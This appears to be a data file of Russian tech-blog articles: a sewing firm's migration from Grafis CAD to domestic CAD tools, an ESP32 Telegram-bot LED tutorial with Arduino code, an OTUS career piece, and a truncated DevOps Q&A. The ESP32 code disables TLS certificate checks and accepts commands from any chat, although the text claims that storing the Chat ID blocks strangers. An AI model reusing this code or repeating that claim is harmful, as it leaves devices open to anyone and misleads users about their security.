19,Инженерный софт для швейного производства,LURE IT,Проектное управление и консалтинг,0,"Консалтинг и поддержка, Связь и телекоммуникации, Информационная безопасность",2025-04-10,"Современная промышленность давно и активно использует информационные технологии. Мы редко задумываемся, что не только окружающие нас смартфоны и компьютеры являются их продуктом. Одеваясь по утрам, мы тоже пользуемся вещами, созданными с помощью современного хайтека.Автоматизация и компьютеризация не обошла стороной текстильную промышленность. Обычная повседневная одежда, не относящаяся к высокой моде, разрабатывается в современных САПР, а сами предприятия работают под управлением систем учета и планирования.Источник: https://www.pinterest.comРано или поздно последствия введения санкций и требования импортозамещения коснутся тех отраслей, продукт которых не переливается светодиодами и не содержит ни одного процессора.Целевая схемаРуководство компании, обратившейся к нам за аудитом и консалтингом, придерживалось консервативного подхода: на предприятии отсутствовал собственный штат, занимающийся развитием направления информационных систем, и вопросы цифровой трансформации находились не в приоритете. Тем не менее, весь процесс проектирования одежды осуществлялся в специализированном программном обеспечении Grafis CAD v11, хотя и не самой актуальной версии. Эта программа охватывает полный цикл разработки: от проектирования лекал до раскладки деталей на тканевом полотне.Перед нами стояло несколько задач. Первая заключалась во внедрении современной системы планирования ресурсов предприятия. Необходимо было организовать работу компании с использованием действующей ERP-системы (Enterprise Resource Planning), что позволило бы эффективно управлять бюджетом с учетом текущей и прогнозируемой загрузки производства. А для этого требовалось внедрение PDM (Product Data Management) системы, содержащей информацию о регламентированном расходе ткани и фурнитуры, требующихся для производства каждого конкретного экземпляра одежды, которая, в свою очередь, тесно связана с инструментами проектирования.Вторая проблема была связана с тем, что компания Grafis прекратила поддержку своего программного обеспечения на предприятиях, находящихся на территории Российской Федерации, и, по новым законодательным требованиям и экономическим реалиям, необходимо было осуществить переход на отечественное ПО. Нам предстояло найти современные российские аналоги, провести их сравнительный анализ по ряду параметров и выбрать наиболее подходящий вариант.Обзор имеющегося софта на рынкеСо второй задачей было чуть проще, поскольку 1С де-факто являлась основной платформой для большинства информационных систем заказчика. Поэтому выбранное решение для проектирования одежды должно было быть совместимым с этой платформой и легко интегрируемым в общий ландшафт.Однако при выборе САПР требовалось учесть перечень функциональных требований предприятия, которому должно удовлетворять выбранное решение:• Параметрическое конструирование. • Работа с различными инженерными методиками проектирования одежды: Optimass, МТИЛП, ЦОТШЛ, ЕМКО СЭВ, Muller and Sohn. • Автоматическая градация лекал - это способ получения выкроек другого размера и роста из базовой модели с помощью задания приращения в определенных конструктивных точках. • Автоматическая оптимальная раскладка элементов одежды на полотне ткани. • Интеграция с системами ERP и PDM.Рынок софта для проектирования одежды весьма узок и давно поделен между несколькими производителями, такими как немецкая GRAFIS Software и американская Gerber AccuMark. Южнокорейская CLO 3D, хотя и является мощным инструментом для 3D-моделирования, не подходит для решения задач, связанных с двухмерным проектированием. Китайские решения, в свою очередь, не рассматривались из-за отсутствия локализации и сложностей с адаптацией.Grafis CAD и Gerber AccuMark. Источник: https://softzone17.com/Основные проблемы с зарубежными программами заключались в отсутствии поддержки (включая обновления) для предприятий на территории РФ, сложностях с приобретением (особенно для Grafis, учитывая переход на систему подписки) и сомнительной возможности интеграции с 1С. Рассматривались даже такие варианты, как SolidWorks и КОМПАС-3D, но они сильно далеки от швейного производства.В качестве альтернатив, подходящих для импортозамещения, были выбраны два варианта: Ассоль (разработка России, входит в реестр отечественного ПО) и Грация (разработка России и Украины, с последующим юридическим разделением). Обе программы соответствуют техническим требованиям предприятия, не имеют проблем с приобретением и поддержкой, Грация имеет возможность интеграции с системой 1С:ERP.Ассоль и Грация. Источники: https://assol.org/, https://www.pinterest.com/Заранее отвечая на возможный скептицизм: «Отечественное — значит плохое», хочется подчеркнуть, что это современные программы, тщательно и вдумчиво разработанные хорошими специалистами, с многолетней историей и отлично себя зарекомендовавшие. Они не являются «сырыми» решениями, созданными в спешке для импортозамещения. Ассоль и Грация — это надежные инструменты с многолетней историей, которые успешно зарекомендовали себя на рынке. Данные программы отличаются от иностранных аналогов, но не являются их «ухудшенной версией».Дополнительным плюсом является то, что обе программы изучаются студентами и преподавателями в российских ВУЗах (в ходе проработки решения мы отправляли запросы в часть университетов, ведь требовалось понять с чем учат работать будущих конструкторов, отдельное спасибо СПбГУПТД за развернутый ответ), а это значит, что проблем с квалифицированными кадрами не будет. Справедливости ради стоит отметить, что в одном из институтов рассматривали возможность покупки программы Grafis для обучения. Но компания-посредник выставила такой астрономический счет, что от этой идеи сразу отказались.Однако у программ Ассоль и Грация есть и недостатки. Самый серьезный из них в данном случае — практически полное отсутствие возможности импорта данных из Grafis для процесса миграции. У Ассоль есть некоторая реализация, но она настолько неудобна, что лучше бы ее не было вовсе. Вендор-лок – большая проблема, так как за 10 лет работы в Grafis на предприятии накопилась огромная база проектов. Один из способов импорта – сканирование с помощью цифрового фото-дигитайзера. Но при этом неизбежно возникают погрешности, которые требуется проверять, искать и компенсировать вручную.Дигитайзер. Источник: https://logicgroup.com/Другие минусы отечественных программ:• В Грации и Ассоль сложнее просматривать сопряжение разных элементов выкройки друг с другом. • Отсутствует возможность конвертации моделей между разными топологиями (например, из мужской модели в детскую). • Невозможно сохранить готовый блок (например, рукав с окружающими элементами) для повторного использования в других моделях. • Автоматическая раскладка в Grafis реализована более удобно и интерактивно. • Набор базовых конструкции в немецкой программе значительно больше.Очевидно, конструкторы, проработавшие 10 лет с Grafis, крайне привязаны к этой программе. Когда руководителя отела проектирования спросили о возможной миграции, то он, на основании предоставленных нами данных, составил очень подробную таблицу сравнения альтернатив и, по его мнению, выбор был только один – следующая версия Grafis.GrafisАссольГрацияВозможность закупкиНетЕстьЕстьПолучение обновлений и поддержкиНетЕстьЕстьИзучение в ВУЗахНетЕстьЕстьНаличие сторонних курсовЕстьЕстьЕстьПараметрическое конструированиеЕстьЕстьЕсть*Интеграция с системой 1С:ERPЕсть**НетЕстьГрадация моделейЕсть***Есть***Есть***Проверка сопряженийЕсть****Есть****Есть****Автоматическая раскладкаЕстьЕстьЕстьСтрана разработкиGERURU/UAСохранение отдельных блоковЕстьНетНетКонвертирование топологииЕстьНетНет1/* - требуется отдельный модуль;2/* - заявлена поддержка API;3/* - Grafis - интерактивно, полуавтоматически, Ассоль - только на лекалах, через диалоговые окна, Грация - вручную;4/* - Grafis - интерактивно в режиме конструирования и просмотра, Ассоль и Грация - только в режиме просмотра.ВыводыНесмотря на все различия между российским ПО и привычным Grafis, было принято решение отказаться от немецкой программы. Основными причинами стали сложности с приобретением (с переходом на подписку в новых версиях), отсутствие поддержки и невозможность интеграции с 1С.Естественно, Grafis не будет удалена со всех компьютеров, и накопленные за годы работы данные не будут утеряны. Доработка текущих проектов продолжится в Grafis, чтобы не задерживать их запуск в производство.Однако основными инструментами для проектирования на предприятии станет сопряжение САПР Ассоль и Грация (с целью взаимного дополнения достоинств друг друга). Для сотрудников будет организовано обучение работе с этими программами. Часть перспективных моделей из старой базы данных будут сконвертированы вручную, но все новые проекты изначально будут создаваться исключительно в отечественных решениях. А Grafis останется в качестве инструмента для просмотра архивов."
20,"Простой способ управления IoT-устройствами через телеграм-бот, используя esp32",RUVDS.com,VDS/VPS-хостинг. Скидка 15% по коду HABR15,0,"Связь и телекоммуникации, Домены и хостинг, Веб-сервисы",2025-04-10,"Картинка  Benzoix, Freepik  Многие знают и даже пробовали, что микроконтроллер esp32 позволяет управлять собой удалённо через интернет, используя протокол mqtt — что позволяет избавиться от необходимости выяснять IP адрес у esp32 и не заботиться о его постоянных изменениях, например, в случае перезагрузки микроконтроллера.  Однако в наше время было бы обидно пройти мимо гораздо более удобного способа, который, на мой взгляд, частенько многократно более удобен, и к тому же находится всегда под рукой — управление с помощью телеграм-бота…  Те, кто регулярно следят за моими статьями, знают, что я частенько использую способ с mqtt, который, по результатам моих тестов, очень хорошо себя проявил, во множестве применений: от управления робототехническими манипуляторами до руления машинками в реальном времени и игры с их помощью в робохоккей.  Для тех, кто думает, что будет большой лаг: я тоже так думал, однако, практика показала, что этот лаг не превышает 100 миллисекунд (а реально даже и ещё меньше), что субъективно воспринимается как «мгновенно».  Тем не менее, у этого способа есть и свои неудобства (маленькие, но всё же):   Требуется внешний mqtt-брокер, который частенько отваливается (скажем, по причине тех же санкций — это то, с чем я сталкивался на практике) и не только. У этих брокеров обычно имеются довольно жёсткие ограничения на количество запросов в секунду, чтобы не перегружать брокер (я сталкивался даже с ограничением в один запрос в секунду максимум), что может быть неудобным в деле управления в реальном времени робототехническими устройствами. Это опять же надо регистрироваться на брокере, заводить аккаунт, да и вообще, разбираться, что собой представляет этот протокол и как работает (если вы раньше не имели с ним дела). Необходимость поднимать свой брокер, если вы хотите убрать зависимость от чужого. И т. д.  В общем, как говорил один из персонажей «Собачьего сердца» — «это какой-то позор» © :-))), так как в наше время всё то же самое можно делать с использованием того же самого telegram-бота. Но на самом деле, приводя выше цитату из «Собачьего сердца» я здесь утрирую, так как просто нужно учитывать, что протокол mqtt появился гораздо раньше того же telegram-а, и с появлением последнего, многое упростилось, что мы и попробуем рассмотреть ниже.   Ну и опять же, гораздо удобнее управлять через мессенджер, который всегда под рукой, чем разбираться и использовать стороннюю систему…  Правда, тут есть нюансы: насколько мне известно, mqtt обеспечивает гораздо меньшую задержку, по сравнению с telegram-ботом (0,1 сек против 1-3 сек). Эта задержка возникает из-за того, что в случае telegram-a, устройство (esp32) вынуждено опрашивать с определённой периодичностью (например, 0,2-3 сек) сервер — «нет ли новых сообщений?» Минусом такого подхода является излишняя нагрузка на сервер, за счёт генерации пустых запросов.  Минимально допустимый интервал опроса составляет от 0,2 сек и более. Если опрашивать сервер слишком часто (т. е. с интервалом менее 0,2 сек), то сервер временно заблокирует бота и будет возникать ошибка 429.  Такой способ отличается простотой реализацией и не требует постоянного соединения на основе протокола websocket (как у mqtt).  В противовес ему, в случае mqtt, мы постоянно подключены к серверу и подписаны на обновления в определённых топиках, за счёт чего мгновенно (менее 100 миллисекунд) получаем обновления, если появилось новое сообщение. Также, как мы видим, при этом способе не генерируются пустые запросы (как в случае с telegram-ботом).  Кстати говоря, в качестве интересной идеи на будущее: а что, если реализовать управление машинкой с использованием telegram-бота в качестве пульта управления? Это интересно как минимум с точки зрения проверки в реальных условиях временного лага, который возникает при этом случае.  Мои подозрения (по опыту, так как я ставил такой лаг принудительно, во время экспериментов с mqtt, при управлении роботами-хоккеистами): 200 миллисекунд — уже чувствуется, но вполне терпимо. И даже для роботов с управлением в реальном времени. Надо протестить на досуге... Тем не менее, если у вас нет жёстких ограничений по времени отклика системы — например, мы управляем открытием окна для вентиляции теплицы, то этот способ вполне годится.  То есть, можно сказать, что вариант управления с помощью telegram-бота годится практически для 90% IoT-устройств, поэтому он и интересен для рассмотрения.  Итак, попробуем пошагово пройти все этапы создания telegram-бота и подключения его к esp32.  На первом этапе нам нужно запустить мессенджер telegram и забить в поиск: @BotFather  Или просто перейти вот по этой ссылке: BotFather — так мы попадём на адрес создания ботов, где нового бота создаём командой /newbot.  После чего нам выдают секретный ключ (HTTP API), которым мы будем пользоваться для подключения к этому боту:    Также, как можно видеть в самой нижней части картинки выше, нам сообщили полный адрес, по которому можно найти нашего бота — запоминаем его ( t.me/......_bot), он нам понадобится дальше.  Кроме того, как можно видеть по картинке выше, здесь есть ряд возможностей, которые стоит изучить, для увеличения возможностей взаимодействия с вашим новым ботом.  Любое управление становится гораздо нагляднее, если оно имеет обратный отклик, поэтому нам потребуется код для загрузки в esp32, который выполняет две функции:   Принимает входящие команды. Отправляет telegram-боту отклик, о том, как команда понята.  Один из самых простых и наглядных способов протестировать работу системы — зажигать и гасить встроенный в esp32 светодиод.  Сделаем так, чтобы мы могли из бота отправлять слова  on, off (без учёта регистра, то есть система должна реагировать, независимо от того, прислали ли мы слова, написанные заглавными буквами или маленькими), в ответ на которые esp32 будет, соответственно, зажигать или гасить встроенный светодиод. Сделано так исключительно из соображений удобства, чтобы не задумываться ещё и о регистре надписей (ссылки на библиотеки для этого кода можно найти в конце статьи):  Полный код для загрузки в esp32 — с обработкой команд on/off //Разработано с применением DeepSeek //Весь код ниже приведён справочно, без какой-либо гарантии его надлежащей работы. #include <WiFi.h> #include <WiFiClientSecure.h> #include <UniversalTelegramBot.h>  // Настройки (ЗАМЕНИТЕ НА СВОИ!) const char* WIFI_SSID = ""вписать сюда""; // Название Wi-Fi-сети const char* WIFI_PASS = ""вписать сюда""; // Пароль Wi-Fi-сети const char* BOT_TOKEN = ""вписать сюда""; // Токен бота от @BotFather  WiFiClientSecure secureClient; UniversalTelegramBot bot(BOT_TOKEN, secureClient);  const int LED_PIN = 2;  // Встроенный светодиод String CHAT_ID = """";    // Храним Chat ID  void debugLog(String message) {   Serial.println(""[DEBUG] "" + message); }  void connectToWiFi() {   debugLog(""Подключаемся к WiFi: "" + String(WIFI_SSID));      WiFi.begin(WIFI_SSID, WIFI_PASS);   while (WiFi.status() != WL_CONNECTED) {     delay(500);     Serial.print(""."");   }      debugLog(""Успешно подключено! IP: "" + WiFi.localIP().toString()); }  void handleCommand(String cmd, String chat_id) {   cmd.toLowerCase(); // Нормализуем команду   debugLog(""Принята команда: '"" + cmd + ""' от chat_id: "" + chat_id);    if (cmd == ""on"" || cmd == ""/on"") {     digitalWrite(LED_PIN, HIGH);     String response = ""💡 Светодиод включён!"";     if (bot.sendMessage(chat_id, response, """")) {       debugLog(""Отправлено: '"" + response + ""'"");     } else {       debugLog(""Ошибка отправки сообщения!"");     }   }    else if (cmd == ""off"" || cmd == ""/off"") {     digitalWrite(LED_PIN, LOW);     String response = ""🌑 Светодиод выключен!"";     if (bot.sendMessage(chat_id, response, """")) {       debugLog(""Отправлено: '"" + response + ""'"");     } else {       debugLog(""Ошибка отправки сообщения!"");     }   }   else {     String response = ""Неизвестная команда. Используйте /on или /off"";     bot.sendMessage(chat_id, response, """");     debugLog(""Отправлен ответ на неизвестную команду"");   } }  void setup() {   Serial.begin(115200);   pinMode(LED_PIN, OUTPUT);   digitalWrite(LED_PIN, LOW);      connectToWiFi();   secureClient.setInsecure();      debugLog(""Система инициализирована. Ожидаем команды...""); }  void loop() {   int newMessages = bot.getUpdates(bot.last_message_received + 1);      if (newMessages > 0) {     debugLog(""Обнаружено новых сообщений: "" + String(newMessages));   }    for (int i = 0; i < newMessages; i++) {     String chat_id = String(bot.messages[i].chat_id);     String text = bot.messages[i].text;          if (CHAT_ID == """") {       CHAT_ID = chat_id;       debugLog(""Зарегистрирован новый Chat ID: "" + CHAT_ID);     }          handleCommand(text, chat_id);   }    delay(500); }   Работает это следующим образом: при первом получении сообщения от бота, микроконтроллер запоминает Chat ID и отвечает:«Бот-повелитель света готов к работе!».   Небольшая справка: наверняка на этом этапе у некоторых возникнет вопрос, а зачем вообще запоминать Chat ID, у нас ведь уже есть уникальный токен, не излишняя ли это процедура?  Дело тут в том, что токен бота и Chat ID это разные вещи, и запоминание Chat ID — необходимая процедура в целях безопасности: если этого не сделать, то любой пользователь сможет управлять вашим ботом, если узнает имя бота, а токен бота тут ни при чём, так как он только даёт доступ к API. После чего, можно отправлять команды  on, off. Можно и сразу отправить команду, без «предварительных раскланиваний» с микроконтроллером, — тогда он сначала вежливо ответит, а потом отпишется, что задание выполнено :-)  На дальнейшие отправки команд он будет отвечать только лаконично и по делу:   Казалось бы, всё работает и всё хорошо… Однако, telegram предоставляет чуть большие возможности, и грех было бы не воспользоваться ими!  А конкретнее: каждый раз набивать команды неудобно, что, если бы под эти команды сделать кнопки, нажимая на которые мы могли бы управлять устройством? Запросто: telegram как раз предоставляет такой функционал.  Кроме того, для удобства наблюдения за происходящим, продублируем вывод сообщений ещё и в монитор порта Arduino IDE, а также добавим логирование происходящего на всех этапах:  [DEBUG] Подключаемся к WiFi: MyWiFi ..... [DEBUG] Успешно подключено! IP: 192.168.1.100 [DEBUG] Система инициализирована. Ожидаем команды... [DEBUG] Обнаружено новых сообщений: 1 [DEBUG] Зарегистрирован новый Chat ID: 123456789 [DEBUG] Принята команда: '/on' от chat_id: 123456789 [DEBUG] Отправлено: '💡 Светодиод включён!'  Теперь наш код принимает не только текстовые сообщения вида on/off, но и выполняет тот же самый функционал, только ещё и при нажатии на кнопки:  Полный код для загрузки в esp32 — с кнопками для telegram //Разработано с применением DeepSeek //Весь код ниже приведён справочно, без какой-либо гарантии его надлежащей работы. #include <WiFi.h> #include <WiFiClientSecure.h> #include <UniversalTelegramBot.h>  const char* WIFI_SSID = ""вписать сюда""; // Название Wi-Fi-сети const char* WIFI_PASS = ""вписать сюда""; // Пароль Wi-Fi-сети const char* BOT_TOKEN = ""вписать сюда""; // Токен бота от @BotFather  WiFiClientSecure secureClient; UniversalTelegramBot bot(BOT_TOKEN, secureClient);  const int LED_PIN = 2; String CHAT_ID = """";  // Создаём клавиатуру с кнопками String makeKeyboard() {   return ""[[""     ""{ \""text\"":\""🔆 ВКЛЮЧИТЬ\"", \""callback_data\"":\""LED_ON\"" },""     ""{ \""text\"":\""🌑 ВЫКЛЮЧИТЬ\"", \""callback_data\"":\""LED_OFF\"" }""   ""]]""; }  void connectToWiFi() {   Serial.begin(115200);   Serial.print(""Подключаемся к WiFi..."");   WiFi.begin(WIFI_SSID, WIFI_PASS);      while (WiFi.status() != WL_CONNECTED) {     delay(500);     Serial.print(""."");   }   Serial.println(""\nПодключено! IP: "" + WiFi.localIP().toString()); }  void handleCommand(String cmd, String chat_id) {   Serial.print(""Получена команда: "");   Serial.println(cmd);    if (cmd == ""LED_ON"" || cmd == ""/on"" || cmd == ""on"" || cmd == ""🔆 ВКЛЮЧИТЬ"") {     digitalWrite(LED_PIN, HIGH);     bot.sendMessageWithReplyKeyboard(chat_id, ""💡 Светодиод включён!"", """", makeKeyboard());     Serial.println(""Светодиод включён"");   }   else if (cmd == ""LED_OFF"" || cmd == ""/off"" || cmd == ""off"" || cmd == ""🌑 ВЫКЛЮЧИТЬ"") {     digitalWrite(LED_PIN, LOW);     bot.sendMessageWithReplyKeyboard(chat_id, ""🌑 Светодиод выключен!"", """", makeKeyboard());     Serial.println(""Светодиод выключен"");   }   else {     bot.sendMessageWithReplyKeyboard(chat_id, ""Используйте кнопки ниже:"", """", makeKeyboard());     Serial.println(""Неизвестная команда"");   } }  void setup() {   pinMode(LED_PIN, OUTPUT);   digitalWrite(LED_PIN, LOW);      connectToWiFi();   secureClient.setInsecure();      Serial.println(""Бот запущен. Ожидаем сообщений...""); }  void loop() {   int numNewMessages = bot.getUpdates(bot.last_message_received + 1);    for (int i = 0; i < numNewMessages; i++) {     String chat_id = String(bot.messages[i].chat_id);     CHAT_ID = chat_id;          // Обрабатываем текст сообщения или callback_data     String message_text = bot.messages[i].text;     if (message_text != """") {       handleCommand(message_text, chat_id);     }   }    // Отправляем клавиатуру при первом запуске   static bool firstRun = true;   if (firstRun && CHAT_ID != """") {     bot.sendMessageWithReplyKeyboard(CHAT_ID, ""Выберите действие:"", """", makeKeyboard());     firstRun = false;   }    delay(500); }   Теперь попробуем загрузить этот код в esp32, после чего запустим нашего telegram-бота и обратимся к микроконтроллеру:   Как можно видеть по картинке выше, после отправки любой команды, даже некорректной, микроконтроллер отвечает, присылая кнопки — изначально их нет, и они появляются внизу экрана, после первого сообщения от микроконтроллера.  После чего можно управлять микроконтроллером, нажимая на эти кнопки (в данном случае мы управляем встроенным светодиодом, включая и выключая его).  Кнопки в коде описываются в формате json, и это позволяет создавать весьма сложные клавиатуры, разной степени вложенности:  String keyboard = ""[[""   ""{\""text\"":\""🔆 ВКЛЮЧИТЬ\"", \""callback_data\"":\""ON\""},""   ""{\""text\"":\""🌑 ВЫКЛЮЧИТЬ\"", \""callback_data\"":\""OFF\""}"" ""]]"";  В коде выше: text — это то, что наблюдает пользователь, а callback_data — команда для esp32 (например, «ON»).  Непосредственная отправка кнопок происходит с помощью прикрепления их к сообщению одной строкой:  bot.sendMessageWithReplyKeyboard(chat_id, ""Выберите действие:"", """", keyboard); В свою очередь, микроконтроллер мониторит эти сообщения в цикле:  int updates = bot.getUpdates(bot.last_message_received + 1); for (int i=0; i<updates; i++) {   if (bot.messages[i].callback_data == ""ON"") {     digitalWrite(LED_PIN, HIGH);     bot.sendMessage(chat_id, ""💡 Включено!"");   } }  Таким образом, используя описанные выше подходы, можно управлять IoT-устройствами весьма простым способом, который в большинстве случаев будет намного проще, чем mqtt: теплицы, полив цветов, видеонаблюдение (разворот вебкамеры, например) и прочее, прочее, прочее (на что воображения хватит).  Тем не менее, не стоит списывать и mqtt со счетов, так как потенциальные задержки при прохождении команд в варианте управления с использованием telegram-бота могут быть неприемлемыми для особо чувствительных к этому устройств.  Ниже вы можете найти библиотеки, которые следует установить, чтобы приведённые выше прошивки микроконтроллера работали. К слову — тестировалась вся работа на микроконтроллере esp32-wroom-32:   ArduinoJson (Вызывается неявно, в составе одной из библиотек ниже, поэтому тоже надо установить). Universal-Arduino-Telegram-Bot. ESP32_WiFiClientSecure.  © 2025 ООО «МТ ФИНАНС»   Telegram-канал со скидками, розыгрышами призов и новостями IT 💻"
21,Уровни управления продуктовой разработкой от Junior до CPO,OTUS,Цифровые навыки от ведущих экспертов,0,"Консалтинг и поддержка, Рекрутинг и HR, Производство мультимедиа-контента",2025-04-10,"Автор: Иван Шмелев (ака Ivano). 12+ лет в разработке продуктовых стратегий для корпораций и стартапов по всему миру. Спикер и автор статей о цифровом бизнесе. Преподаватель курсов «Senior Product Manager», «CPO / Директор по продукту» в OTUSВ начале трудовой деятельности специалисты заранее планируют свою «карьерную лестницу». Многие полагают, что карьера — это получение должности, но на самом деле это вопрос про уровень ответственности и саморазвития. Разбираем подробно, чем С-уровень отличается от Junior в цифровом бизнесе. Организационная структураПонятие «компания» сформировались сравнительно недавно в историческом масштабе. Изначально за основу взяли иерархическую военную структуру, как доказавшую свою эффективность: во главе генеральный директор, под ним руководители направлений, а ниже исполнители. С масштабированием бизнеса структура усложнялась, появились дивизионы, департаменты, отделы и т.п. Со временем появились альтернативные организационные структуры, наиболее приспособленные для определённого вида бизнеса. Проектные компании перешли на матричную структуру, консалтинг и научные коллективы на плоскую, а цифровой бизнес на сетевую структуру с Agile командами. Некоторые крупные компании отказались от прямого подчинения генеральному директору и перешли на коллегиальное управление, в которое так же входит новый топ-менеджер Chief Product Officer (CPO). Среди российских цифровых гигантов, это: Авито, Ozon и другие.Уровни ответственности и компетенцииПарадокс в том, что структуры разных бизнесов схожи. В любой компании есть отделы Продаж, HR, Финансов, Продуктовой разработки и т.п. Разница только в людях! Именно поэтому важно, кто занимает ключевые должности, за что отвечает и как исполняет свои обязанности.  Ключевое слово – отвечает! Если у сотрудника не обозначена зона ответственности, значит он не имеет никакого значения для бизнеса и его сократят. В 2025 году начались массовые увольнения в IT-секторе и в первую очередь распустили команды, не способные создавать востребованные сервисы. Массовые увольнения прокатились даже в таких корпорациях как Сбер, МТС, VK и т.п.Чем выше уровень позиции, тем больше ответственности и компетенций требуется.  Заблуждение полагать, что ответственность лежит только на руководителях. При эффективной организационной структуре и отлаженных процессах, у каждого сотрудника своя зона ответственности. Случаются и карьерные скачки, когда сотрудника без наличия необходимых компетенций продвигают на уровень выше. В большинстве таких случаев период адаптации проходит болезненно и для коллектива, и для бизнеса, поэтому предпочитают продвигать уже подготовленных к росту сотрудников. Подготовится к переходу на следующий уровень, это личная задача каждого специалиста, нацеленного на успешный карьерный рост.Карьерный путь означает – последовательная и методичная прокачка навыков, необходимых для перехода на следующий уровень ответственностиВ продуктовой разработке существует три уровня менеджмента: Product Manager, Senior Product Manager и CPO. В OTUS есть курсы по каждому из них.Ключевым различием между уровнями является доступ к информации, ресурсам и полномочия (authority).  Чем выше уровень, тем больше ресурсов для реализации своих задач. Так, CPO имеет возможность запросить дополнительные ресурсы напрямую у Совета Директоров (кратко: Совет) или расставить приоритет по выполнению задач для коллег на уровне ниже. Прокачка навыковУникальная методика OTUS исходит из следующей концепции: Каждый уровень имеет два направления коммуникаций: вверх и вниз. В каждом направлении у кого-то есть требования к вам и ваши ожидания к другому уровню. Таким образом, каждый уровень имеет 4 типа коммуникаций, 2 вверх и 2 вниз. Проще говоря, кто-то от вас что-то требует, а от кого-то что-то ожидаете вы сами. Именно эти «ожидания» и «требования» и есть те самые ключевые навыки, которые необходимо прокачать.Вот как выглядят направления, которые охватывает курс CPO:На продуктовых курсах OTUS основной фокус на прокачку навыка коммуникаций вверх, т.к. подразумевается, что студенты развивают свою карьеру поступательно и уже имеют навык работы на предыдущем уровне.  Перспективным кандидатом на повышение является тот сотрудник, который имеет навык коммуникаций с руководителем.Прежде всего, на своём текущем уровне соответствуйте своим же требованиям к подчиненным, если бы вы были руководителем. Собрали типичные требования и ожидания на разных уровнях. Уровень «Product»Ответственность менеджера, это качественно выполненные задачи. Ключевые навыки: Дисциплина и владение инструментами. От своего руководителя специалист ожидает четко поставленную задачу и наличие условий для ее выполнения. Подчиненных нет.Задачи в основном функциональные: Проведение исследований, мониторинг, расчеты и т.п.Качественной коммуникацией наверх являются: формализация задач и проактивность. Руководитель должен быть уверен, что его задачи четко поняты и будут реализованы в срок, а в случае возникновения сложностей иметь предложения по их устранению. Неправильно обращаться к руководителю с комментарием «Ой, не получилось» или «Это не я виноват». Востребованный сотрудник обращается к руководству с предложением в формате: «Мы не успеем в срок, потому что возникла такая-то ситуация. Чтобы успеть, нужно то-то и то-то».На курсе «Product Manager IT-проектов» в OTUS обучают ключевым инструментам Продакт-менеджера и прокачивают предприимчивость. Уровень «Senior Product Manager»Уровень управленца среднего звена, на котором предстоит управлять задачами и метриками. В зону ответственности входят: Планирование и отладка процессов. Чтобы качественно выполнить свою работу, сверху должны поступить продуктовая стратегия, целеполагание, приоритет и ресурсы. Обычно на этом уровне есть подчиненные, которые от своего руководителя ожидают четко поставленные задачи.В перечень задач входят: Roadmap, PnL, CJM, формирование метрик, Go-to-market, генерация гипотез, контроль, отчетность и т.п.Ценными качествами являются: самостоятельность и эффективность. Сверху ожидают, что планы будут реализованы в срок. Никаких «Скажите, что делать». К CPO следует обращаться только с отчетностью, за корректировками планов и для получения ресурсов.На курсе «Senior Product Manager», в OTUS обучают планированию, расчетам и прокачивают навыки управленца, от четкой постановки задач до разрешения конфликтов.Уровень «CPO / Директор по продукту»Продуктовый лидер, который напрямую подчиняется Совету Директоров или CEO. В зону ответственности входит поиск возможностей и их реализация. Для этого ему нужны ресурсы, которые распределяются наверху. Ему подчиняется вся продуктовая разработка, которая ожидает от него наглядных целей, приоритет и ресурсы. В его активность входят: Поиск возможностей, продуктовая стратегия, синхронизация планов, выбивание ресурсов, структура продукта и организация продуктовой разработки.На этом уровне ключевой ценностью является – доверие! Иначе никто не предоставит доступ к ресурсам. К ключевым качествам можно отнести визионерство и системный подход. Все инициативы от CPO должны быть рассчитаны, воодушевлять и соответствовать целям акционеров.На курсе «CPO / Директор по продукту» в OTUS обучают стратегическому планированию, а также прокачивают навык визионерства и питчинга.Уровень «Совет»В зависимости от организационной структуры, это может быть CEO, Совет Директоров или группа акционеров. Их ответственность — привлекать и распределять ресурсы, в частности, административные. Часто в Совете люди с нужными связями или влиянием. Основной вид деятельности — отбор предложений и внешние коммуникации.На этот уровень возможно попасть только по рекомендациям или с высокой репутацией, поэтому курсов в рамках OTUS по нему нет.Возможности OTUSЦелью этой статьи было описать разницу между уровнями в продуктовой разработке, она значительная. Для перехода с одного уровня на другой недостаточно обладить опытом работы, необходимо соответствовать. Все требуемые навыки и компетенции можно прокачать на образовательной платформе OTUS, выбрав соответствующий курс.Помните, что своей карьерой управляете только вы сами! Ваши компетенции — это продукт, который покупает работодатель.Так сделайте свои компетенции востребованными.OTUS готовит Продакт-Менеджеров по собственной уникальной методологии и материалам. Все лекции читают преподаватели с многолетней практикой в компаниях по всему миру.Конечно, это лишь краткий пересказ всех различий. Более подробно обсудим каждый из этих уровней на одном из бесплатных открытых вебинаров, который пройдет 16 апреля. Далеко не все понимают, чем отличаются обязанности Chief Product Officer (CPO) от других продакт-менеджеров и какие компетенции необходимы, чтобы занять эту ключевую позицию. Разложим все аспекты по полочкам на уроке, записаться можно на странице курса ""CPO""."
22,"DevOps в крупных компаниях: вопросы и ответы от экспертов Selectel, Postgres Professional и СберТех",Слёрм,"Учебный центр для тех, кто работает в IT",0,"Веб-разработка, Связь и телекоммуникации",2025-04-10,"В феврале Слёрм вместе с Вячеславом Федосеевым, TeamLead DevOps в «Честном знаке», запустили спецпроект «Честные вакансии: DevOps Middle». Это серия бесплатных вебинаров с экспертами из бигтеха, на которых мы обсуждаем ключевые этапы карьерного роста в DevOps, необходимые навыки, редфлаги при найме и многое другое.Эта статья — краткая выжимка из вебинаров с гостями из Selectel, Postgres Professional и СберТех. В ней мы объединили мнения экспертов, чтобы дать вам полное представление о том, какие требования предъявляют компании к DevOps-специалистам, и что делать, чтобы вырасти до middle-позиции.Первая статья с вопросами и ответами от экспертов Fournines, VK Tech и Kaspersky — тут.1. Путь джуниора и ошибкиВопрос: С какими трудностями сталкиваются джуниоры в DevOps, и как их преодолеть?Ответ (Selectel):Джуниоры часто сталкиваются с трудностями, особенно в начале карьеры. Важно не бояться просить помощи у коллег. Работа в токсичных компаниях не способствует росту, поэтому лучше выбирать компании, которые обучают и дают интересные задачи. В Selectel, например, мы поддерживаем стажёров и помогаем им вырасти в полноценных специалистов.Ответ (Postgres Professional):Для джуниоров важно не только техническое обучение, но и понимание процессов разработки и эксплуатации. Мы рекомендуем начинать с базовых технологий, таких как Linux и базы данных, и постепенно углубляться в более сложные темы, такие как Kubernetes и CI/CD.2. DevOps и DevSecOpsВопрос: В чем разница между DevOps и DevSecOps, и какие навыки необходимы для работы в этих направлениях?Ответ (Selectel):DevOps требует знаний Kubernetes, Linux и контейнеризации. DevSecOps добавляет акцент на безопасность: это поддержка существующих решений и разработка новых с учетом требований безопасности. Важно уметь автоматизировать инфраструктуру, работать с инструментами CI/CD (GitLab, 